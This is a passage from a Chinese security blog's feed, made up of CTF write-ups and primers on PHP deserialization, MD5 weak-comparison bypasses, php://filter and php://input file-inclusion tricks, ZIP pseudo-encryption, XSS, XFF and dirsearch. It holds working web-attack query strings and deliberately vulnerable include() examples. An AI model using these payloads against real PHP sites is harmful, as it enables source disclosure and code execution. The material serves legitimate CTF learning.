class="number">0</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190916203459392.png" alt="在这里插入图片描述">题目url传入string=O:4:”hack”:1:{s:4:”mod1”;O:3:”str”:1:{s:4:”str1”;O:8:”get_flag”:0:{}}}即可。<br><img src="https://img-blog.csdnimg.cn/20190916203712233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x07-如果还有如果"><a href="#0x07-如果还有如果" class="headerlink" title="0x07 如果还有如果"></a>0x07 如果还有如果</h1><p>估计就是代码审计了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">"nwuctf&#123;xxxxxxxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'QUERY_STRING'</span>])) &#123;</span><br><span class="line">    $query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">    $res = parse_str($query);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'action'</span>]))&#123;</span><br><span class="line">        $action = $res[<span class="string">'action'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'auth'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        $user = $res[<span class="string">'user'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">        $pass = $res[<span class="string">'pass'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($user) &amp;&amp; !<span class="keyword">empty</span>($pass)) &#123;</span><br><span class="line">        $hashed_password = hash(<span class="string">'md5'</span>, $user.$pass);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($hashed_password) &amp;&amp; $hashed_password === <span class="string">'22180f07c8d8de04667257a18d9a64c6'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail :('</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;auth&amp;hashed_password&#x3D;22180f07c8d8de04667257a18d9a64c6</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;NWUCTF刷题记录&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>X-Forwarded-For</title>
    <link href="http://yoursite.com/2020/02/03/X-Forwarded-For/"/>
    <id>http://yoursite.com/2020/02/03/X-Forwarded-For/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T07:52:29.184Z</updated>
    
    <content type="html"><![CDATA[<p>X-Forwarded-For<br>简称<strong>XFF头</strong>，是一个扩展头，它代表客户端也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项（百度百科：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的<strong>客户端最原始的IP地址</strong>的<strong>HTTP请求头字段</strong>）。</p><a id="more"></a><p>X-Forwarded-For请求头格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:client,proxy1,proxy2</span><br></pre></td></tr></table></figure><p>格式比较简单，首先是离服务端最远的设备IP，然后就是每一级代理设备的IP。如果一个HTTP请求到达服务器之前，经过了三个代理Proxy1、Proxy2、Proxy3，IP分别为IP1、IP2、IP3，用户真实IP是IP0，那么根据XFF标准，服务器最终会收到下面的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:IP0,IP1,IP2</span><br></pre></td></tr></table></figure><p>Proxy3直连服务器，它会给XFF追加IP2，帮Proxy2转发请求。列表中并没有 IP3，IP3 可以在服务端通过 $ remote_address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，$remote_address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。<br>详细分析一下，这样的结果是经过这样的流程而形成的：</p><ol><li>用户IP0—&gt; 代理Proxy1（IP1），Proxy1记录用户IP0，并将请求转发给Proxy2时，带上一个Http Header <code>X-Forwarded-For: IP0</code>。</li><li>Proxy2收到请求后读取到请求有 X-Forwarded-For: IP0，然后Proxy2 继续把链接上来的Proxy1 IP追加到 X-Forwarded-For 上面，构造出X-Forwarded-For: IP0, IP1，继续转发请求给Proxy 3。</li><li>同理，Proxy3 按照第二部构造出 X-Forwarded-For: IP0, IP1, IP2,转发给真正的服务器，比如nginx，nginx收到了http请求，里面就是 X-Forwarded-For: IP0, IP1, IP2 这样的结果。所以Proxy 3 的IP3，不会出现在这里。</li><li>nginx 获取Proxy3的IP 能通过$ remote_address获取到，因为这个<br>$ remote_address就是真正建立TCP链接的IP，这个不能伪造，是直接产生链接的IP。$remote_address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。</li></ol><p>如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，<em>如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加</em>。<br>XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。</p><p>部分转载自<a href="https://www.jianshu.com/p/15f3498a7fad" target="_blank" rel="noopener">https://www.jianshu.com/p/15f3498a7fad</a>，（侵权删</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;X-Forwarded-For&lt;br&gt;简称&lt;strong&gt;XFF头&lt;/strong&gt;，是一个扩展头，它代表客户端也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项（百度百科：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的&lt;strong&gt;客户端最原始的IP地址&lt;/strong&gt;的&lt;strong&gt;HTTP请求头字段&lt;/strong&gt;）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>NWUCTF misc</title>
    <link href="http://yoursite.com/2020/02/03/NWUCTF-misc/"/>
    <id>http://yoursite.com/2020/02/03/NWUCTF-misc/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:06:07.715Z</updated>
    
    <content type="html"><![CDATA[<p>NWUCTF刷题misc</p><a id="more"></a><h1 id="0x00-zip文件伪加密"><a href="#0x00-zip文件伪加密" class="headerlink" title="0x00 zip文件伪加密"></a>0x00 zip文件伪加密</h1><p>一个 ZIP 文件由三个部分组成：<br>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 </p><p>普及一下知识，(●’◡’●)<br><strong>压缩源文件数据区</strong>：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500<br>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p><p><img src="https://img-blog.csdnimg.cn/2019091820430056.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">箭头指向处03改为00保存即可看到不需要密码了。</p><h1 id="0x01-弄脏的二维码"><a href="#0x01-弄脏的二维码" class="headerlink" title="0x01 弄脏的二维码"></a>0x01 弄脏的二维码</h1><p>题目给了一个二维码，还有<br>提示：黑既是白，白既是黑<br>hint:复原定位符，扫描二维码<br>于是用stegsolve打开，黑白翻转一下，<br><img src="https://img-blog.csdnimg.cn/2019091820130856.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091820153783.png" alt="在这里插入图片描述"></p><p>再用PS把定位符P上，扫一扫就出来了。<br><img src="https://img-blog.csdnimg.cn/20190918201649666.jpg" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;NWUCTF刷题misc&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://yoursite.com/2020/02/03/XSS/"/>
    <id>http://yoursite.com/2020/02/03/XSS/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:07:45.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>跨站脚本攻击（Cross Cite Scripting），它是通过<strong>对网页注入可执行代码（通常是JavaScript代码）且成功地被浏览器执行</strong>，达到攻击的目的，形成了一次有效XSS攻击。一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，黑客可以利用xss盗取用户的cookie，有了用户的cookie，可以以用户的身份来正常访问站点。有时候还和其他攻击方式同时实施，比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨大的。为了不和层叠样式表（Cascading Style Sheets，CSS）混淆，就把跨站脚本攻击缩写为XSS。</p><a id="more"></a><p>XSS分为反射型、存储型、DOM型。反射型一般出现在url中，提交给服务器，然后服务器返回，会在页面渲染过程中引发XSS。存储型，提交的数据存储在服务器端，下次访问页面时还会触发XSS，因此相对于另外两个，危害性大一些。DOM型不会经过服务器端，只是放在客户端。也有人将其分为持久型和非持久型，持久型就是存储型，非持久型就是反射型。<br>具体详细内容看大佬博客吧(<a href="https://blog.csdn.net/extremebingo/article/details/81176394" target="_blank" rel="noopener">https://blog.csdn.net/extremebingo/article/details/81176394</a>)<br>小白学习中~~</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;p&gt;跨站脚本攻击（Cross Cite Scripting），它是通过&lt;strong&gt;对网页注入可执行代码（通常是JavaScript代码）且成功地被浏览器执行&lt;/strong&gt;，达到攻击的目的，形成了一次有效XSS攻击。一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，黑客可以利用xss盗取用户的cookie，有了用户的cookie，可以以用户的身份来正常访问站点。有时候还和其他攻击方式同时实施，比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨大的。为了不和层叠样式表（Cascading Style Sheets，CSS）混淆，就把跨站脚本攻击缩写为XSS。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MOCTF web</title>
    <link href="http://yoursite.com/2020/02/03/Moctf%20Web/"/>
    <id>http://yoursite.com/2020/02/03/Moctf%20Web/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:11:35.210Z</updated>
    
    <content type="html"><![CDATA[<p>MOCTF刷题ing</p><a id="more"></a><h1 id="php黑魔法"><a href="#php黑魔法" class="headerlink" title="php黑魔法"></a>php黑魔法</h1><p>emmm传送门只有下图，<br><img src="https://img-blog.csdnimg.cn/20190925170324387.png" alt="在这里插入图片描述"><br>查看源代码，也没有发现什么，于是，查看一下<a href="http://119.23.73.3:5001/web5/index.php" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/index.php</a>，还是什么都没有，大佬提示访问<a href="http://119.23.73.3:5001/web5/index.php~" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/index.php~</a>，然后查看源代码，<br><img src="https://img-blog.csdnimg.cn/20190925170819861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">大致意思是参数a,b的md5值相等，但a不等于b，就可以输出flag。<br>两种方法：<br>1.构造数组，md5加密遇到数组时都返回false，于是相等，但值并不相等。<code>?a[]=1&amp;b[]=2</code><br>2.md5加密后0e开头的都相等，例如：240610708 和 QNKCDZO。   <code>?a=240610708&amp;b=QNKCDZO</code></p><h1 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h1><p>题目一开始就放了源码，<br><img src="https://img-blog.csdnimg.cn/20190925173549623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仔细审计一下，首先，waf函数是要求传入的键名中不能有flag字符。之后，就是一个不容易看懂的循环了，<br><img src="https://img-blog.csdnimg.cn/20190925174051605.png" alt="在这里插入图片描述"><br>大致意思是，把_POST,_GET,_COOKIE依次传给$ _R，如果$ $ _R有数据（_POST,_GET）传数据过来了，就执行下一步循环。可是， $ _R怎么变成了$ $_R了呢？<br>$ $ _R实际上是 $ _R值的值，打个比方，有a=&gt;b;    b=&gt;c;那么我 $ $a 就是是取出a的值的值,也就是说取出c。<br>之后我们进入下一个foreach， $<strong>K为键名， $</strong>V为值。如果键名作为变量所对应的值与 $ $<strong>R的值相等，则unset掉 $ $</strong>K。这里unset经过我查资料理解为就是把这个值在程序中所对应的内存清除掉。简单来说就是销毁了他，他就不存在了。<br>接着往下，这一段的意思是如果对应的值存在，那么满足if进入waf函数。<br><img src="https://img-blog.csdnimg.cn/20190925175132111.png" alt="在这里插入图片描述"><br>extract函数的功能是从数组中将变量导入到当前的符号表，举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 假定 $var_array 是 wddx_deserialize 返回的数组*/</span></span><br><span class="line">$size = <span class="string">"large"</span>;</span><br><span class="line">$var_array = <span class="keyword">array</span>(<span class="string">"color"</span> =&gt; <span class="string">"blue"</span>,</span><br><span class="line">                   <span class="string">"size"</span>  =&gt; <span class="string">"medium"</span>,</span><br><span class="line">                   <span class="string">"shape"</span> =&gt; <span class="string">"sphere"</span>);</span><br><span class="line">extract($var_array, EXTR_PREFIX_SAME, <span class="string">"wddx"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$color, $size, $shape, $wddx_size\n"</span>;</span><br><span class="line"><span class="comment">//输出blue, large, sphere, medium</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而EXTR_SKIP意思是如果前面存在了此键名，那么我不会覆盖掉前面的。<br><img src="https://img-blog.csdnimg.cn/20190925175523344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>wtcl不得不看大佬的wp了，这道题我们的目的是要读取flag.php这个页面的内容，而如果我们不绕过waf，那么我们是不能读取的。<br>所以我们要通过POST一个特殊的内容来达到绕过的目的。根据代码的逻辑，我们发现如果我们提前把_GET的内容给unset掉，之后顺便的通过waf，然后再通过extract函数给还原回来是不是就达到我们的目的了？？？<br><strong>实现</strong>：<br>题目需要我们传入三个值，分别为flag,daiker和file,其中file是需要对waf进行绕过的，这里到了解决问题的关键，我们传入<code>http://119.23.73.3:5101/?flag=s878926199a&amp;daiker=s155964671a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php</code><br>其中flag和daiker不能相同，但flag和daiker的md5值需要相等，注意到判断md5值时使用了==的方式，可以利用php的弱类型判断。file利用php://filter伪协议进行读取。<br>然后，我们还需要post一系列数据，payload:_GET[flag]=s878926199a&amp;_GET[daiker]=s155964671a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php。此时我们对情况进行分析在进行_POST的foreach时，_k的值为_GET[flag],其值的值为我们在url中get进去的flag的值，这与我们post进去的值相同。unset()起作用，_GET[flag]的值消失，waf失效。<br>页面最底下出现一串base64编码<code>PD9waHAKJGZsYWcgPSAnbW9jdGZ7ZTIxODFiNW8xNGE2NzE1OWNjMjNvYzhmZW9kNmM1YjZ9JzsKCgo=</code>，解码一下，得到moctf{e2181b5o14a67159cc23oc8feod6c5b6}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MOCTF刷题ing&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>robots协议</title>
    <link href="http://yoursite.com/2020/02/03/robots%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/02/03/robots%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:06:40.214Z</updated>
    
    <content type="html"><![CDATA[<p>晚上刷ctf时，做到一题，关于robots的，作为小白的我，丝毫不会，就查了一下。</p><a id="more"></a><p>robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它 。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。当 一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><p>点开网址什么都没有，看教程说要用dirsearch扫目录脚本，又百度了一下。。。</p><p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。</p><p>在kali中用以下命令即可使用：(kali中自带python环境）<br>git clone <a href="https://github.com/maurosoria/dirsearch.git" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch.git</a><br>cd dirsearch/<br>./dirsearch.py -u 目标网址 -e *<br>果然扫到了robots.txt，emmm，尴尬的是，不会访问该文件，后来大神指点，在网址链接后面加上robots.txt即可访问，表示学到了，?终于得到了flag.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;晚上刷ctf时，做到一题，关于robots的，作为小白的我，丝毫不会，就查了一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Bugku pwn</title>
    <link href="http://yoursite.com/2020/02/03/Bugku%20pwn/"/>
    <id>http://yoursite.com/2020/02/03/Bugku%20pwn/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:07:26.744Z</updated>
    
    <content type="html"><![CDATA[<p>刷题~~</p><a id="more"></a><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p>在Linux里面输入以下命令，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 114.116.54.89 10001&#x2F;&#x2F;nc用于设置路由器</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure><p>然后cat flag，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20190825204438222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h2><p>nc命令是一个功能打包的网络实用程序，它通过命令行在网络上读取和写入数据;nc是为NMAP项目编写的，是目前已分裂的netcat家族的顶峰,它被设计成一个可靠的后端工具，可以立即为其他用户提供网络连接应用程序和用户。nc不仅可以使用IPv4和IPv6，而且可以为用户提供无限的潜在用途。</p><p>在nc的大量功能中，有能力将nc链接在一起；TCP、UDP和到其他站点的SCTP端口；支持SSL；通过socks4或HTTP代理（带有可选代理）进行代理连接身份验证）;一些一般原则适用于大多数应用程序，因此使您能够立即向通常不支持它的软件添加网络支持。<br>nc命令用法详解见<a href="https://www.cnblogs.com/nmap/p/6148306.html" target="_blank" rel="noopener">博客</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刷题~~&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="http://yoursite.com/2020/02/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/02/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:06:18.394Z</updated>
    
    <content type="html"><![CDATA[<p>感觉web里面还会经常遇到php伪协议的，总结一下。</p><a id="more"></a><p>php支持的协议如下：</p><ol><li>file:// — 访问本地文件系统</li><li>http://— 访问Http(s)网址</li><li>ftp://— 访问ftp(s) urls</li><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>zlib:// — 压缩流</li><li>data:// — 数据（RFC 2397）</li><li>glob:// — 查找匹配的文件路径模式</li><li>phar:// — PHP 归档</li><li>ssh2:// — Secure Shell 2</li><li>rar:// — RAR</li><li>ogg:// — 音频流</li><li>expect:// — 处理交互式的流<h1 id="环境概要"><a href="#环境概要" class="headerlink" title="环境概要"></a>环境概要</h1>PHP.ini:</li></ol><p>allow_url_fopen：默认为on  ，该选项为on便是激活了url 形式的 fopen封装协议，使得可以访问 url 对象文件等。</p><p>allow_url_include：  默认为off，不允许url里的封装协议访问对象文件。</p><h1 id="0x00-是否截断问题"><a href="#0x00-是否截断问题" class="headerlink" title="0x00 是否截断问题:"></a>0x00 是否截断问题:</h1><h2 id="不需要截断"><a href="#不需要截断" class="headerlink" title="不需要截断"></a>不需要截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="需要截断"><a href="#需要截断" class="headerlink" title="需要截断"></a>需要截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'file'</span>].<span class="string">'.php'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x01-allow-url-fopen与allow-url-include是否开启的问题："><a href="#0x01-allow-url-fopen与allow-url-include是否开启的问题：" class="headerlink" title="0x01 allow_url_fopen与allow_url_include是否开启的问题："></a>0x01 allow_url_fopen与allow_url_include是否开启的问题：</h1><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p>使用方法：<br>file:// [文件的绝对路径和文件名]<br><img src="https://img-blog.csdnimg.cn/20191009204203130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h2><p>条件：<br>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，<strong>php://filter用于读取源码</strong>，<strong>php://input用于执行php代码</strong>。</p><hr><p><strong>php://filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br>例如，有时url会传入<code>?file=php://filter/read=convert.base64-encode/resource=./cmd.php</code></p><p>PHP.ini：<br>php://filter在双off的情况下也可以正常使用；</p><p>allow_url_fopen ：off/on<br>allow_url_include：off/on</p><hr><p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p>PHP.ini：</p><p>allow_url_fopen ：off/on<br>allow_url_include：on</p><p>例：<br><img src="https://img-blog.csdnimg.cn/20191009204108596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h2 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip://, bzip2://, zlib://协议"></a>zip://, bzip2://, zlib://协议</h2><p>PHP.ini：</p><p>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</p><p>allow_url_fopen ：off/on<br>allow_url_include：off/on</p><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p><h3 id="（1）zip-协议"><a href="#（1）zip-协议" class="headerlink" title="（1）zip://协议"></a>（1）zip://协议</h3><p>使用方法：<br>zip://archive.zip#dir/file.txt<br>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]<br>（注：由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23）<br>例：<code>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</code></p><h3 id="（2）bzip2-协议"><a href="#（2）bzip2-协议" class="headerlink" 